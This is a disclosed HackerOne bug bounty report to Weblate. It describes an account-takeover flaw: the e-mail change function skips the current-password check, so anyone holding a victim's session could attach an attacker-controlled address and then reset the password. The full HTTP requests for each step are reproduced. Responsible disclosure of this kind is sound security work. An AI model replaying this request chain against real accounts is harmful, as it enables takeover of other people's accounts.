# Weak e-mail change functionality could lead to account takeover

## Report Details
- **Report ID**: 223461
- **URL**: https://hackerone.com/reports/223461
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-24T14:17:27.626Z
- **Disclosed**: 2017-05-17T16:56:58.530Z

## Reporter
- **Username**: twicedi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
Hi,

**Summary**
I have found a design issue on the e-mail change functionality offered by the "/accounts/profile" handler.
In particular, the e-mail change functionality does not require the current user password to be completed.
Since the e-mail could be used to reset the password of the account, an attacker, with temporary access to the victim's account (e.g. physical access to a device with an active session or by stealing the session etc.) could associate a new e-mail to the account, change the primary e-mail associated with the new one and then use the "forgot password" functionality to reset it, bypassing the current "password change" functionality ("/accounts/password" handler) that correctly requires the current password to be completed.

**Step to reproduce**
To reproduce the issue it is possible to add a new e-mail:

Request (note that the current password is not required):
```
POST /accounts/email/ HTTP/1.1
Host: hosted.weblate.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Referer: https://hosted.weblate.org/
Cookie: csrftoken=kA26tUUVL9ygh9BIlSuuWBGUQlYvoO0kYd3M97qEi4CnXove7tbDTXk6NTLoSOIl; _pk_id.14.7ba2=0d80180050f49544.1493038019.1.1493041708.1493038019.; _pk_ses.14.7ba2=*; django_language=it; sessionid=4yntub067zylgtuulbkci9e031tshiaj
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

csrfmiddlewaretoken=SLhsGgqa4B8Y0DOFLPNQEbu9MyV64vCewoi8mtWTBwc5GSIbxquZBx8lJ6IZyvkf&email=user1%2Bhackerone%40████████&content=
```
Validate the new e-mail with the link sent by the web app (that is controlled by the "attacker"):

Request (note that the current password is not required):
```
GET /accounts/complete/email/?verification_code=51554eb9e31b44d6a48f8b41acda9a43&id=uy7kg0n6l8nhmihjvcgwzg3dpama80gn&type=reset HTTP/1.1
Host: hosted.weblate.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: csrftoken=kA26tUUVL9ygh9BIlSuuWBGUQlYvoO0kYd3M97qEi4CnXove7tbDTXk6NTLoSOIl; _pk_id.14.7ba2=0d80180050f49544.1493038019.1.1493041853.1493038019.; _pk_ses.14.7ba2=*; django_language=it; sessionid=uy7kg0n6l8nhmihjvcgwzg3dpama80gn
Connection: close
Upgrade-Insecure-Requests: 1
```

Change the primary e-mail with the new one (current password not required):
```
POST /accounts/profile/ HTTP/1.1
Host: hosted.weblate.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Referer: https://hosted.weblate.org/
Cookie: csrftoken=kA26tUUVL9ygh9BIlSuuWBGUQlYvoO0kYd3M97qEi4CnXove7tbDTXk6NTLoSOIl; _pk_id.14.7ba2=0d80180050f49544.1493038019.1.1493041762.1493038019.; _pk_ses.14.7ba2=*; django_language=it; sessionid=4yntub067zylgtuulbkci9e031tshiaj
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 464

csrfmiddlewaretoken=HsdKr0zHG89lB0X3at4kJLVn3u0dP8L7l5eq7d5qd3dshfRzW4LtG7zz02N6j8t8&activetab=%23account&language=it&secondary_in_zen=on&editor_link=&special_chars=&dashboard_view=1&dashboard_component_list=&csrfmiddlewaretoken=HsdKr0zHG89lB0X3at4kJLVn3u0dP8L7l5eq7d5qd3dshfRzW4LtG7zz02N6j8t8&csrfmiddlewaretoken=HsdKr0zHG89lB0X3at4kJLVn3u0dP8L7l5eq7d5qd3dshfRzW4LtG7zz02N6j8t8&username=user2hackerone&first_name=User2+HackerOne&email=user1%2Bhackerone%40█████████
```

An finally request the reset of the password with the new e-mail (controlled by the "attacker"):
```
POST /accounts/reset/ HTTP/1.1
Host: hosted.weblate.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Referer: https://hosted.weblate.org/
Cookie: csrftoken=kA26tUUVL9ygh9BIlSuuWBGUQlYvoO0kYd3M97qEi4CnXove7tbDTXk6NTLoSOIl; _pk_id.14.7ba2=0d80180050f49544.1493038019.1.1493041843.1493038019.; _pk_ses.14.7ba2=*; django_language=it; sessionid=k10nwu1h62lcfpvot1c8njbia65ki4ne
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

csrfmiddlewaretoken=fjHTb3nw1dwzvClDckQxIIWjmehS02X3TWIzRgTfy8AGbRf9YVxGF4AvjM4Lu2F4&email=user1%2Bhackerone%40████&content=
```

This could lead to permanent account takeover without knowing the current password of the victim (and so bypassing the current password change functionality).

I'm available for further clarification,

Best,
Davide


## Attachments
No attachments
